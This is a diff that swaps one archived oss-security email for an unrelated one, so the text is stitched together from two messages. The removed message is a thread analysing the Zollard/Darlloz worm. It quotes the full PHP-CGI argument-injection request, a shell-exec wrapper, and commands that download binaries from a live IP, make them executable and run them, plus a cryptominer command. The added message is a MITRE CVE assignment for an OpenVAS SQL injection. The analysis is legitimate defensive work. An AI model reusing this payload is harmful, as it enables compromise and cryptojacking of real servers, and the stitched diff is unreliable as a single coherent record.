@@ -1,144 +1,40 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/10/11/1
-Message-ID: <5438DACA.70803@reactos.org>
-Date: Sat, 11 Oct 2014 09:22:50 +0200
-From: Pierre Schweitzer <pierre@...ctos.org>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/12/03/1
+Message-ID: <Pine.LNX.4.64.1412021941360.27520@beijing.mitre.org>
+Date: Tue, 2 Dec 2014 19:42:45 -0500 (EST)
+From: cve-assign@...re.org
 To: oss-security@...ts.openwall.com
-Subject: Re: What does this PHP exploit do?
+Subject: Re: CVE request: OpenVAS Manager SQL injection (OVSA20141128)
 Content-Type: text/plain; charset=utf-8
+
 
 -----BEGIN PGP SIGNED MESSAGE-----
 Hash: SHA1
 
-So, the answer is yes (last time I answer myself, sorry).
-This worm is Linux.Darlloz:
-http://www.symantec.com/security_response/writeup.jsp?docid=2013-112710-1612-99
+>An SQL injection flaw has been fixed in OpenVAS Manager:
+>
+>http://www.openvas.org/OVSA20141128.html
 
-On 10/10/2014 22:00, Pierre Schweitzer wrote:
-> I was about to forget: it also makes sure it is started on each 
-> machine reboot by modifying init ramdisk.
-> 
-> This was done through a quick analysis. It would require deeper
-> one. Maybe someone already did one?
-> 
-> On 10/10/2014 21:55, Pierre Schweitzer wrote:
->> Dear Dave,
-> 
->> Going quickly through the PHP script shows that it downloads
->> lots of executables for various architectures to then try to run
->> them (hence the chmod +x) on the host it was downloaded. So
->> pretty portable worm.
-> 
->> The executable it downloads appears to have two basic functions:
->> -> replicating itself over the network -> starting a
->> cryptocurrency miner (CPU miner) on the infected host
-> 
->> Here is the way it starts the miner: ./minerd -q -B -a scrypt -o 
->> http://p2pool.org:5643 -u MDFepZz9SpSbFSugUsXVE3CmrdTaKg1SWi -p 
->> pass
-> 
->> Cheers, Pierre
-> 
->> On 10/10/2014 21:28, Dave Horsfall wrote:
->>> My apologies if this is off-topic for this list, but out of
->>> all the security lists of which I am a member this seems to be
->>> the closest one that fits, so please point me to a more
->>> appropriate one in that case..
-> 
->>> I'm trying to figure out what this exploit does; it started 
->>> around the time that Shellshock did, but I don't think that 
->>> they're related.
-> 
->>> It downloads binaries for several architectures (even a MIPS) 
->>> which amongst other things futzes around with IPTABLES 
->>> (including blocking the TELNET port) and appears to be 
->>> self-reproducing.
-> 
->>> The hex-encoded stuff in the script below decodes to
-> 
->>> "-d+allow_url_include=on+-d+safe_mode=off+-d+suhosin.simulation=on+-d+disable_functions=""+-d+open_basedir=none+-d+auto_prepend_file=php://input+-d+cgi.force_redirect=0+-d+cgi.redirect_status_env=0+-n"
->
->>> 
->>> 
-> 
->>> but my PHP-fu doesn't quite extend that far (and that 
->>> "safe_mode=off" looks a bit suss).
-> 
->>> Script below, kindly supplied by 0wned boxes the world over (in
->>>  this case, Korea):
-> 
->>> POST 
->>> /cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E
->>>
->>>
->
->>> 
-HTTP/1.1 Host: xxx.xxx.xxx.xxx User-Agent: Mozilla/5.0 (compatible;
->>> Zollard; Linux) Content-Type: application/x-www-form-urlencoded
->>>  Content-Length: 1817 Connection: close
-> 
->>> <?php echo "Zollard"; $disablefunc = 
->>> @ini_get("disable_functions"); if (!empty($disablefunc)) { 
->>> $disablefunc = str_replace(" ","",$disablefunc); $disablefunc =
->>>  explode(",",$disablefunc); } function myshellexec($cmd) {
->>> global $disablefunc; $result = ""; if (!empty($cmd)) { if 
->>> (is_callable("exec") and !in_array("exec",$disablefunc)) 
->>> {exec($cmd,$result); $result = join("\n",$result);} elseif 
->>> (($result = `$cmd`) !== FALSE) {} elseif
->>> (is_callable("system") and !in_array("system",$disablefunc))
->>> {$v = @ob_get_contents(); @ob_clean(); system($cmd); $result =
->>> @ob_get_contents(); @ob_clean(); echo $v;} elseif
->>> (is_callable("passthru") and 
->>> !in_array("passthru",$disablefunc)) {$v = @ob_get_contents(); 
->>> @ob_clean(); passthru($cmd); $result = @ob_get_contents(); 
->>> @ob_clean(); echo $v;} elseif (is_resource($fp = 
->>> popen($cmd,"r"))) { $result = ""; while(!feof($fp)) {$result
->>> .= fread($fp,1024);} pclose($fp); } } return $result; } 
->>> myshellexec("rm -rf /tmp/armeabi;wget -P /tmp 
->>> http://119.206.52.15:58455/armeabi;chmod +x /tmp/armeabi"); 
->>> myshellexec("rm -rf /tmp/arm;wget -P /tmp 
->>> http://119.206.52.15:58455/arm;chmod +x /tmp/arm"); 
->>> myshellexec("rm -rf /tmp/ppc;wget -P /tmp 
->>> http://119.206.52.15:58455/ppc;chmod +x /tmp/ppc"); 
->>> myshellexec("rm -rf /tmp/mips;wget -P /tmp 
->>> http://119.206.52.15:58455/mips;chmod +x /tmp/mips"); 
->>> myshellexec("rm -rf /tmp/mipsel;wget -P /tmp 
->>> http://119.206.52.15:58455/mipsel;chmod +x /tmp/mipsel"); 
->>> myshellexec("rm -rf /tmp/x86;wget -P /tmp 
->>> http://119.206.52.15:58455/x86;chmod +x /tmp/x86"); 
->>> myshellexec("rm -rf /tmp/nodes;wget -P /tmp 
->>> http://119.206.52.15:58455/nodes;chmod +x /tmp/nodes"); 
->>> myshellexec("rm -rf /tmp/sig;wget -P /tmp 
->>> http://119.206.52.15:58455/sig;chmod +x /tmp/sig"); 
->>> myshellexec("/tmp/armeabi;/tmp/arm;/tmp/ppc;/tmp/mips;/tmp/mipsel;/tmp/x86;");
->
->>>  -- Dave
-> 
-> 
-> 
-> 
-> 
-> 
+Use CVE-2014-9220.
 
-- -- 
-Pierre Schweitzer <pierre at reactos.org>
-System & Network Administrator
-Senior Kernel Developer
-ReactOS Deutschland e.V.
+The original finder, Michael Eissele, has requested that Michael Meyer
+(mime), also of Greenbone Networks, be publicly recognized because he
+"worked out the final exploitation PoC which was needed to get some
+output of the Database."
+
+- ---
+
+CVE assignment team, MITRE CVE Numbering Authority M/S M300
+202 Burlington Road, Bedford, MA 01730 USA
+[ PGP key available through http://cve.mitre.org/cve/request_id.html ]
 -----BEGIN PGP SIGNATURE-----
-Version: GnuPG v1
+Version: GnuPG v1.4.14 (SunOS)
 
-iQIcBAEBAgAGBQJUONrKAAoJEHVFVWw9WFsLIJEQAIlTO/+h2BX03EbMpiIITMLZ
-7tBReFO9kHs9+Q7aTbsnPBN6yFsw/8jOONZgK8YN08zC8U8OmrPpVku8maoiA6tC
-yaajNW6kIVAbHz66nIVQFVR83F07/TVdFajAcK5w8jelSxkEUTQNzsMzTzi/4dbG
-Ujgap8djhZq/GlkPIWOgp9aOYTkZaW6e4Q8tkcxMVzk1V3jDv8/b1tY/RnQkpo5Y
-1B/FRlfX5O0GMkQOeXx8cPjyMvm07bsZp1Wf9rjqjYbnwYC/e6xc9wUuiOnChp6B
-UDcZ+3Pj0vL25ateYnvu7q62qegDJCOi8U0ZhVephbfr1LKCst08Tx9GJVw8HpdI
-sLG6R1Y8u126BZfo4wJWq5wqwtupiooSgV5FSBPVrsDnpmRrP4K5FRPqQCE+N8wy
-EQJSwVBV/BQXSu1VZzHupwO8zxWFG0/403RMjBC6rmknU89Z42Dl35t4T0Ut17Ex
-/E1jixKX75LEW8t/op3GQJNmnmr26oXJ7wjo2w5o5IKYd4LbZYiG6RWBuzV5kmjd
-+KaWZA4iMsQ1nieFR+GrRH8HdkQmMGH/SxzxFgd1blChR/0b9kzWjlElB78eyB+E
-aQCWt6LyJOgAsKK1lYx+fRzi2B4ec8q9xhFVlQ9X+wZTJPNL+RBNKcR6WkSiu7nd
-vYdwwGGcbzNvhwXoUFWr
-=XSBb
+iQEVAwUBVH5bPqllVAevmvmsAQItJQgAhhxh8qKdxuykhmBRq98HN102+RJjglak
+5DsBO8jBtqiNgI7dWGCMQjxScWkfIVR3wNOl+2nKRq2g8mljjpIYTHwB3953NDVJ
+yF7g9KBCwYroMYkTEhQVnI+NK4nh/URXmAdOxYwkFVh+kFcbrMxHt4eS1/UN0EnB
+1OAvH7Deadj69+F56rgoU3jMvVUe+6GBOhxwIqx8ySSLBoEsuiJ+HTjvBqHkX+gV
+MoAaysX4yo9BzL6CIwNAfYe70AQpWKY+gBJVqqpp62Sl1vKtkIc9S6KfpfnocQBv
+6bY5kX2RNEv5cGGzAHY4nMeFfrchIpRe7QZeRrlVyRb4NiXtgbwNHw==
+=+rTC
 -----END PGP SIGNATURE-----
